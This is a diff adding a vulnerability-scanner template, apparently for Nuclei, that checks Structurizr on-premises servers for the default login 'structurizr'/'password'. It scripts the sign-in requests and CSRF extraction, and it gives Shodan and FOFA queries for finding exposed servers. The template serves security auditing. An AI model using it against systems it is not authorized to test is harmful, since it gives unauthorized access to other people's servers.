@@ -1,0 +1,64 @@
+id: structurizr-default-login
+
+info:
+  name: Structurizr - Default Login
+  author: DhiyaneshDK
+  severity: high
+  description: |
+    Structurizr contains default credentials.
+  reference:
+    - https://docs.structurizr.com/onpremises/quickstart
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: http.favicon.hash:1199592666
+    product: on-premises_installation
+    vendor: structurizr
+    fofa-query: icon_hash=1199592666
+  tags: structurizr,default-login,vuln
+
+http:
+  - raw:
+      - |
+        GET /signin HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}&_csrf={{csrf}}&hash=
+      - |
+        GET /dashboard HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    attack: pitchfork
+    payloads:
+      username:
+        - "structurizr"
+      password:
+        - "password"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_3
+        words:
+          - '<a href="/dashboard">'
+          - 'Sign out'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: csrf
+        group: 1
+        regex:
+          - 'name="_csrf" value="([0-9a-z-]+)"'
+        internal: true
+# digest: 4b0a00483046022100e2b7cc2c2b2ddb1622f0b084cee0551a907cc555520d19c2bae219ae7565a19c022100eb9d7ccb2a0d82328996f59c6237a1625b80c2bc01afa1f93441a1bee5a6170e:922c64590222798bb761d5b6d8e72950
